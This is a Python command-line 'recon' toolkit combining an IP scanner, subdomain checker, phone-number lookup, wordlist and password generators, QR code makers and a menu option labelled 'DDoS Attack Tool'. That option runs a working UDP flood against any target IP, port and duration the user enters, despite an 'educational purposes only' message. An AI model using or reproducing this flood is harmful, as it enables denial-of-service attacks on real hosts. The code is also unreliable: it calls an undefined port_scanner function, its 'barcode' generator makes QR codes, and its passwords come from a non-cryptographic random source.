import socket
import time
import ipaddress
import requests
import qrcode
import random
import string
from pyzbar.pyzbar import decode
from PIL import Image
import os
import phonenumbers
from phonenumbers import geocoder, carrier
from itertools import product

def ip_scanner(ip_range):
    print("Scanning IPs...")
    active_ips = []
    for ip in ipaddress.IPv4Network(ip_range, strict=False):
        try:
            socket.gethostbyaddr(str(ip))
            active_ips.append(str(ip))
        except socket.herror:
            pass
    return active_ips



def generate_barcode(data, filename):
    qr = qrcode.QRCode(
        version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)
    print(f"Barcode saved as {filename}")

def generate_qrcode(data, filename):
    img = qrcode.make(data)
    img.save(filename)
    print(f"QR Code saved as {filename}")

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def generate_wordlist(words, length):
    return [''.join(word) for word in product(words, repeat=length)]

def phone_info(phone_number):
    parsed_number = phonenumbers.parse(phone_number)
    country = geocoder.description_for_number(parsed_number, 'en')
    operator = carrier.name_for_number(parsed_number, 'en')
    return country, operator

def subdomain_checker(domain, subdomains):
    print("Checking subdomains...")
    active_subdomains = []
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url, timeout=1)
            active_subdomains.append(url)
        except requests.RequestException:
            pass
    return active_subdomains

def ddos_attack(target, port, duration):
    print("Starting DDoS simulation (for educational purposes only)...")
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (target, port))
        except KeyboardInterrupt:
            break
    print("DDoS simulation ended.")

if __name__ == "__main__":
    print("Recon and Information Gathering Tool")
    print("1. IP Scanner")
    print("2. Port Scanner")
    print("3. Barcode Generator")
    print("4. QR Code Generator")
    print("5. Password Generator")
    print("6. Wordlist Generator")
    print("7. Phone Number Information")
    print("8. Subdomain Checker")
    print("9. DDoS Attack Tool")

    choice = int(input("Enter your choice: "))

    if choice == 1:
        ip_range = input("Enter IP range (e.g., 192.168.1.0/24): ")
        print(ip_scanner(ip_range))

    elif choice == 2:
        ip = input("Enter IP address: ")
        ports = list(map(int, input("Enter ports (comma-separated): ").split(',')))
        print(port_scanner(ip, ports))

    elif choice == 3:
        data = input("Enter data for barcode: ")
        filename = input("Enter filename to save barcode: ")
        generate_barcode(data, filename)

    elif choice == 4:
        data = input("Enter data for QR code: ")
        filename = input("Enter filename to save QR code: ")
        generate_qrcode(data, filename)

    elif choice == 5:
        length = int(input("Enter password length: "))
        print(f"Generated password: {generate_password(length)}")

    elif choice == 6:
        words = input("Enter words (comma-separated): ").split(',')
        length = int(input("Enter wordlist length: "))
        print(generate_wordlist(words, length))

    elif choice == 7:
        phone_number = input("Enter phone number with country code: ")
        country, operator = phone_info(phone_number)
        print(f"Country: {country}, Operator: {operator}")

    elif choice == 8:
        domain = input("Enter domain: ")
        subdomains = input("Enter subdomains (comma-separated): ").split(',')
        print(subdomain_checker(domain, subdomains))

    elif choice == 9:
        target = input("Enter target IP: ")
        port = int(input("Enter target port: "))
        duration = int(input("Enter duration (seconds): "))
        ddos_attack(target, port, duration)

    else:
        print("Invalid choice.")
